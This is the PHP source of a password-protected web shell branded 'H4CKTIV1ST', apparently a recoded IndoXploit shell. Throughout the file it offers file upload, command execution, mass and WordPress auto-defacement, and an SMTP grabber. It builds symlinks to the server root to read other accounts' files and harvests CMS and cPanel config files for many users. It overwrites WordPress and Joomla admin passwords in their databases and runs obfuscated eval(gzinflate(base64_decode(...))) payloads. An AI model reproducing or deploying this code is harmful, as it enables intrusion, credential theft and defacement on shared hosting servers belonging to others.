<?php
//H4CKTIV1ST Shell
//IndoXploit Shell V1 Recoded By Pandu Satria Ft Aprian Ditia ( Fix404 Ft USER135 )
//default password nya "makan"
//Tutornya Cari Di Blog http://reportcode.blogspot.com 
@session_start(); 
@error_reporting(0); 
@error_log(0);
...
$lol="d7b6e9d219bded316d298ce3ca4071ce"; 
function printLogin() { 
    ?> 
<html>
<head>
<center>
<title>H4CKTIV1ST</title>
<link rel='short icon' href='http://free-icon-rainbow.com/i/icon_04684/icon_046840_256.png'>
<link href='http://free-icon-rainbow.com/i/icon_04684/icon_046840_256.png' rel='icon' type='image/x-icon'/>
<link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Audiowide|Space+Mono' rel='stylesheet'>
<center>
<header>
<img src='https://scontent-sit4-1.xx.fbcdn.net/v/t34.0-12/17203764_707193492786528_864689943_n.png?

oh=9ed6ef67b4e8817df701ca4bc396e586&oe=58CE9827' width='475' height='350'>
<br>
<style type="text/css"> <!-- .style2 {font-size: small} .style4 {color: #FF0000; font-weight: bold; } .style5 {color: 

#FFFFFF} .style8 {color: #FFFFFF; font-weight: bold; } .style10 {color: #FF0000} --> </style> <body bgcolor="#000000"> <div 

align="center"> </span></font></b><font color="#008000">
<style> 
body {
background: #000;
...
.neon {
color: #FFFFFF;
text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 45px #ff0000, 0 0 40px #ff0000;
}
...
<body bgcolor="black">
<center><font color="white" size='5' face='Audiowide'>
<h1>H4CKTIV1ST Shell</h1></center>
                         
<meta name='author' content='Fix404'>
<meta charset="UTF-8">
<style type='text/css'>
...
statusIn(thetitle)
    ...
    <form method=post> 
    <input type=password name=Fix404> 
    </form></center>
...
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['Fix404'] ) && ( md5($_POST['Fix404']) == $lol ) ) ) 
...
<script language="JavaScript">
    javascript:startTyping(text, 60, "textDestination");
    </script>
   <style type="text/css">
...
$c = "/fix_tools/".$names.".php";
if (file_exists('fix_tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "fix_tools/'.$names.'.php";</script> ';
	}
	else {mkdir("fix_tools", 0777);
file_put_contents('fix_tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "fix_tools/'.$names.'.php";</script> ';}}}
...
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=white>ON</font>" : "<font color=aqua>OFF</font>";
$ling="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=aqua>ON</font>" : "<font color=white>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=aqua>ON</font>" : "<font color=white>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=aqua>ON</font>" : "<font color=white>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=aqua>ON</font>" : "<font color=white>OFF</font>";
$python = (exe('python --help')) ? "<font color=aqua>ON</font>" : "<font color=white>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=white>$ds</font>" : "<font color=aqua>NONE</font>";
...
<center><font color='white' size=5 face='Audiowide'>
<h1>H 4 C K T I V 1 S T</h1></font></center>";
echo "<hr>";
echo "<font color='white'>";
echo "<table style='width:100%'>";
echo "<tr><td><font color='white'>System: <font color=aqua>".php_uname()."</font></td></tr>";
echo "<tr><td><font color='white'>User: <font color=aqua>".$user."</font> (".$uid.") Group: <font color=aqua>".

$group."</font> (".$gid.")</td></tr>";
echo "<tr><td><font color='white'>Server IP: <font color=aqua>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: 

<font color=aqua>".$_SERVER['REMOTE_ADDR']."</font></td></tr>";
echo "<tr><td><font color='white'>HDD: <font color=aqua>".hdd(disk_free_space("/"))."</font> / <font color=aqua>".hdd

(disk_total_space("/"))."</font></td></tr>";
echo "<tr><td><font color='white'>Websites :</font><font color=aqua> $count </font> Domains</td></tr>";
echo "<tr><td><font color='white'>Port :</font><font color=aqua>  $sport</font> </td></tr>";
echo "<tr><td><font color='white'>Safe Mode:</font> $sm</td></tr>";
echo "<tr><td><font color='white'>Disable Functions:</font> $show_ds</td></tr>";
echo "<tr><td><font color='white'>MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </td></tr>";
echo "<tr><td><font color='white'>Current DIR:</font> ";
echo "</font>";
echo "<font color='white'>";
...
<div class='head_info'><center></div>";
echo "</td></tr></table><hr>";
echo "<center><div id='menu'>";
echo "<font face='Quicksand' color='cyan'>";
echo "<ul>";
echo "<b>";
...
echo "<li><a href='?dir=$dir&do=smtp'>SMTP Grabber</a><br></li>";
...
echo "<li><a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a><br></li>";
...
if($_GET['do'] == 'upload') {
	...
	if($_POST['upload']) {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			...
			$act = "<font color=white>failed to upload file</font>";
		}
	}
	echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' 

name='ix_file'><input type='submit' value='upload' name='upload'></form>";
	echo $act;
	echo "</center>";
} 
 elseif($_GET['do'] == 'cmd') {
	...
	function edit_file($file,$index){
		...
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
			...
			echo "<Span style='color:white;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( 
...
(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-

bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-

backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
...
($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-

bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-

backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
	...
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:white;' name='index' 
...
rows='10' cols='67'>\n";
		...
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . 
...
$file . '</a><br>'; }
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Fix404</textarea><br>
...
if($_FILES["zip_file"]["name"]) {
	...
	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-
...
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: 

underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font 

style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/fix_backup.zip' 

style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";	
	if($_POST['backup']){ 
	$save=$_POST['save'];
...
RecursiveIteratorIterator::SELF_FIRST);
	...
	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip 

Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font 

style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/fix_unzip' style='width: 

450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zip = new ZipArchive;
...
(('vUddQtswFH1epf4HcCE1VUxbNvEwdSMGd9FeJtGhPaygyLZ5B6jc5AaHORP/fdf5IoXxsBeiSbGdZu491z6+cTiA1GVPdCkwDTIaDnM5lyVupoT5Nc1ymWWm

WpZdRm9FXWOGqzguTlue4Utjpa+p53a411OCIcKZFCxqGVUES63F8XGSylAx3jr+oATX45SXE3LBubGwAsM16RLpY5Jlp

+aHh1RR8jscWaPZpI0dzbay/hdZJJqkziiFUZV5t5ohSmIE1POy0M+Bl



ai4J5n72gj0Wfza+sM

+x29+D6bR5eFWaK2xCcCQcELBxy9Y8DbOjFY2nF26JjF88lC3zmYZHEJ8hYkTFaJFtp7j3dpzPvfdKxZKYx9j1CWkFJfuSbvZMzDAf78MRdXgQ724/Oz5cVtR7d

A7BK95oW9TvX6id8rrLYhYIaupzSEqntthpHSeYK2aXmfYEWLxqojGkjH3mRJcryqge1uN6CvYvgbLZdJJPqPi928ml2vNqHd

+yU4Q6botthiDsI//AU='))))));
         } elseif($_GET['do'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode

(("

+DflE+hSPAhY+VyXsxRlZ6p3x



WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb+

+a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz
...
elseif($_GET['do'] == 'about') {
    ...
    echo '<center>Fix404 Shell<hr>IndoXploit Shell Recoded By Fix404<br>For More Script Visit <a 

href="http://cr1p.blogspot.com/">Here</a>';
...
if($_POST['gass']) {
	...
	echo"</textarea><br>
		...
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/fix_symconf/'><br>
...
Firefox/32.0");
		...
		foreach($link as $dir_config) {
			...
			if($target == '') {					
				echo "[-] <font color=white>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "<font color=blue>[</font> $target <font color=blue>]</font></font><br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=white>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
...
Firefox/32.0");
		...
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
					...
					$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE 

id='$id'");
					echo "Config => ".$dir_config."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=white>error, gabisa ambil nama domain 
...
nya</font><br>";
					...
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=white>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => Done , Username : <font color=aqua>$user</font> Password : 

<font color=aqua>$pass</font><br><br>";
					}
					mysql_close($conn);
					}
	} 	
...
@mkdir("fix_symconf", 0777);
@chdir("fix_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex Fix404.htm
...
$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/fix_symconf/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-

SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");
...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 
...
echo "<center>
<a href=\"fix_symconf/root/\">Root Server</a>
<br><a href=\"fix_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"fix_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
...
<td>".$user['name']."</td>
<td><a href='$full/fix_sym/root/home/".$user['name']."/public_html' target='_blank'><font 

class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == 

"var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || 

$matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == 

"var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/fix_sym/root/home/" . $matches . "/public_html 

target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("fix_sym",0777);@chdir("fix_sym");@exe("ln -s / root");$file3 = '
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Fix404'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Hackivist Team'><br>
		<u>Domains</u>: <br>
...
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 

2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
...
elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("fix_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("fix_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_fix) {
			$user_config_dir = "/home/$user_fix/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
										"/home/$user_fix/.my.cnf" => "cpanel",
					"/home/$user_fix/.accesshash" => "WHM-accesshash",
					"/home/$user_fix/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_fix/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_fix/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_fix/public_html/clientarea/configuration.php" => "WHMCS",			

	
					"/home/$user_fix/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_fix/public_html/forum/config.php" => "phpBB",
					"/home/$user_fix/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_fix/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_fix/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_fix/public_html/admin/config.php" => "OpenCart",
					"/home/$user_fix/public_html/slconfig.php" => "Sitelok",
					"/home/$user_fix/public_html/application/config/database.php" => "Ellislab",		

			
					"/home/$user_fix/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_fix/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home/$user_fix/public_html/central/configuration.php" => "WHM Central",
					"/home/$user_fix/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home/$user_fix/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home/$user_fix/public_html/submitticket.php" => "WHMCS",				

						
					"/home/$user_fix/public_html/configuration.php" => "Joomla",				

	
					"/home/$user_fix/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_fix/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home/$user_fix/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home/$user_fix/public_html/Home/configuration.php" => "JoomlaHome",
					"/home/$user_fix/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home/$user_fix/public_html/home/configuration.php" => "JoomlaHome",
					"/home/$user_fix/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home/$user_fix/public_html/New/configuration.php" => "JoomlaNew",
					"/home/$user_fix/public_html/new/configuration.php" => "JoomlaNew",
					"/home/$user_fix/public_html/News/configuration.php" => "JoomlaNews",
					"/home/$user_fix/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home/$user_fix/public_html/news/configuration.php" => "JoomlaNews",
					"/home/$user_fix/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home/$user_fix/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home/$user_fix/public_html/cms/configuration.php" => "JoomlaCms",
					"/home/$user_fix/public_html/Main/configuration.php" => "JoomlaMain",
					"/home/$user_fix/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home/$user_fix/public_html/main/configuration.php" => "JoomlaMain",
					"/home/$user_fix/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home/$user_fix/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home/$user_fix/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home/$user_fix/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_fix/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home/$user_fix/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home/$user_fix/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home/$user_fix/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home/$user_fix/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home/$user_fix/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home/$user_fix/public_html/Press/configuration.php" => "JoomlaPress",
					"/home/$user_fix/public_html/press/configuration.php" => "JoomlaPress",
					"/home/$user_fix/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home/$user_fix/public_html/wp/configuration.php" => "JoomlaWp",
					"/home/$user_fix/public_html/WP/configuration.php" => "JoomlaWP",
					"/home/$user_fix/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home/$user_fix/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home/$user_fix/public_html/Portal/configuration.php" => "JoomlaPortal",		

			
					"/home/$user_fix/public_html/wp-config.php" => "WordPress",
					"/home/$user_fix/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_fix/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home/$user_fix/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home/$user_fix/public_html/Home/wp-config.php" => "WordPressHome",
					"/home/$user_fix/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home/$user_fix/public_html/home/wp-config.php" => "WordPressHome",
					"/home/$user_fix/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home/$user_fix/public_html/New/wp-config.php" => "WordPressNew",
					"/home/$user_fix/public_html/new/wp-config.php" => "WordPressNew",
					"/home/$user_fix/public_html/News/wp-config.php" => "WordPressNews",
					"/home/$user_fix/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home/$user_fix/public_html/news/wp-config.php" => "WordPressNews",
					"/home/$user_fix/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home/$user_fix/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home/$user_fix/public_html/cms/wp-config.php" => "WordPressCms",
					"/home/$user_fix/public_html/Main/wp-config.php" => "WordPressMain",
					"/home/$user_fix/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home/$user_fix/public_html/main/wp-config.php" => "WordPressMain",
					"/home/$user_fix/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home/$user_fix/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home/$user_fix/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home/$user_fix/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_fix/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home/$user_fix/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home/$user_fix/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home/$user_fix/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home/$user_fix/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home/$user_fix/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home/$user_fix/public_html/Press/wp-config.php" => "WordPressPress",
					"/home/$user_fix/public_html/press/wp-config.php" => "WordPressPress",
					"/home/$user_fix/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home/$user_fix/public_html/wp/wp-config.php" => "WordPressWp",
					"/home/$user_fix/public_html/WP/wp-config.php" => "WordPressWP",
					"/home/$user_fix/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home/$user_fix/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home/$user_fix/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home1/$user_fix/.my.cnf" => "cpanel",
					"/home1/$user_fix/.accesshash" => "WHM-accesshash",
					"/home1/$user_fix/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_fix/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_fix/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_fix/public_html/clientarea/configuration.php" => "WHMCS",			

	
					"/home1/$user_fix/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_fix/public_html/forum/config.php" => "phpBB",
					"/home1/$user_fix/public_html/sites/default/settings.php" => "Drupal",
					"/home1/$user_fix/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_fix/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_fix/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_fix/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_fix/public_html/application/config/database.php" => "Ellislab",		

			
					"/home1/$user_fix/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_fix/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home1/$user_fix/public_html/central/configuration.php" => "WHM Central",
					"/home1/$user_fix/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home1/$user_fix/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_fix/public_html/submitticket.php" => "WHMCS",				

						
					"/home1/$user_fix/public_html/configuration.php" => "Joomla",				

	
					"/home1/$user_fix/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_fix/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_fix/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home1/$user_fix/public_html/Home/configuration.php" => "JoomlaHome",
					"/home1/$user_fix/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home1/$user_fix/public_html/home/configuration.php" => "JoomlaHome",
					"/home1/$user_fix/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home1/$user_fix/public_html/New/configuration.php" => "JoomlaNew",
					"/home1/$user_fix/public_html/new/configuration.php" => "JoomlaNew",
					"/home1/$user_fix/public_html/News/configuration.php" => "JoomlaNews",
					"/home1/$user_fix/public_html/NEWS/configuration.php" => "JoomlaNews",
					"/home1/$user_fix/public_html/news/configuration.php" => "JoomlaNews",
					"/home1/$user_fix/public_html/Cms/configuration.php" => "JoomlaCms",
					"/home1/$user_fix/public_html/CMS/configuration.php" => "JoomlaCms",
					"/home1/$user_fix/public_html/cms/configuration.php" => "JoomlaCms",
					"/home1/$user_fix/public_html/Main/configuration.php" => "JoomlaMain",
					"/home1/$user_fix/public_html/MAIN/configuration.php" => "JoomlaMain",
					"/home1/$user_fix/public_html/main/configuration.php" => "JoomlaMain",
					"/home1/$user_fix/public_html/Blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_fix/public_html/BLOG/configuration.php" => "JoomlaBlog",
					"/home1/$user_fix/public_html/blog/configuration.php" => "JoomlaBlog",
					"/home1/$user_fix/public_html/Blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_fix/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
					"/home1/$user_fix/public_html/blogs/configuration.php" => "JoomlaBlogs",
					"/home1/$user_fix/public_html/beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_fix/public_html/Beta/configuration.php" => "JoomlaBeta",
					"/home1/$user_fix/public_html/BETA/configuration.php" => "JoomlaBeta",
					"/home1/$user_fix/public_html/PRESS/configuration.php" => "JoomlaPress",
					"/home1/$user_fix/public_html/Press/configuration.php" => "JoomlaPress",
					"/home1/$user_fix/public_html/press/configuration.php" => "JoomlaPress",
					"/home1/$user_fix/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home1/$user_fix/public_html/wp/configuration.php" => "JoomlaWp",
					"/home1/$user_fix/public_html/WP/configuration.php" => "JoomlaWP",
					"/home1/$user_fix/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home1/$user_fix/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home1/$user_fix/public_html/Portal/configuration.php" => "JoomlaPortal",		

			
					"/home1/$user_fix/public_html/wp-config.php" => "WordPress",
					"/home1/$user_fix/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_fix/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_fix/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home1/$user_fix/public_html/Home/wp-config.php" => "WordPressHome",
					"/home1/$user_fix/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home1/$user_fix/public_html/home/wp-config.php" => "WordPressHome",
					"/home1/$user_fix/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home1/$user_fix/public_html/New/wp-config.php" => "WordPressNew",
					"/home1/$user_fix/public_html/new/wp-config.php" => "WordPressNew",
					"/home1/$user_fix/public_html/News/wp-config.php" => "WordPressNews",
					"/home1/$user_fix/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home1/$user_fix/public_html/news/wp-config.php" => "WordPressNews",
					"/home1/$user_fix/public_html/Cms/wp-config.php" => "WordPressCms",
					"/home1/$user_fix/public_html/CMS/wp-config.php" => "WordPressCms",
					"/home1/$user_fix/public_html/cms/wp-config.php" => "WordPressCms",
					"/home1/$user_fix/public_html/Main/wp-config.php" => "WordPressMain",
					"/home1/$user_fix/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home1/$user_fix/public_html/main/wp-config.php" => "WordPressMain",
					"/home1/$user_fix/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_fix/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home1/$user_fix/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_fix/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_fix/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
					"/home1/$user_fix/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_fix/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_fix/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_fix/public_html/BETA/wp-config.php" => "WordPressBeta",
					"/home1/$user_fix/public_html/PRESS/wp-config.php" => "WordPressPress",
					"/home1/$user_fix/public_html/Press/wp-config.php" => "WordPressPress",
					"/home1/$user_fix/public_html/press/wp-config.php" => "WordPressPress",
					"/home1/$user_fix/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home1/$user_fix/public_html/wp/wp-config.php" => "WordPressWp",
					"/home1/$user_fix/public_html/WP/wp-config.php" => "WordPressWP",
					"/home1/$user_fix/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home1/$user_fix/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home1/$user_fix/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home2/$user_fix/.my.cnf" => "cpanel",
					"/home2/$user_fix/.accesshash" => "WHM-accesshash",
					"/home2/$user_fix/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_fix/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_fix/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_fix/public_html/clientarea/configuration.php" => "WHMCS",			

	
					"/home2/$user_fix/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_fix/public_html/forum/config.php" => "phpBB",
					"/home2/$user_fix/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_fix/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_fix/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_fix/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_fix/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_fix/public_html/application/config/database.php" => "Ellislab",		

			
					"/home2/$user_fix/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_fix/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home2/$user_fix/public_html/central/configuration.php" => "WHM Central",
					"/home2/$user_fix/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home2/$user_fix/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_fix/public_html/submitticket.php" => "WHMCS",				

						
					"/home2/$user_fix/public_html/configuration.php" => "Joomla",				

	
					"/home2/$user_fix/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_fix/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_fix/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home2/$user_fix/public_html/Home/configuration.php" => "JoomlaHome",
					"/home2/$user_fix/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home2/$user_fix/public_html/home/configuration.php" => "JoomlaHome",
					"/home2/$user_fix/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home2/$user_fix/public_html/New/configuration.php" => "JoomlaNew",
					"/home2/$user_fix/public_html/new/configuration.php" => "JoomlaNew",
					"/home2/$user_fix/public_html/News/configuration.php" => "JoomlaNews",
					"/home2/$user_fix/public_html/NEWS/configuration.php" => "JoomlaNews",
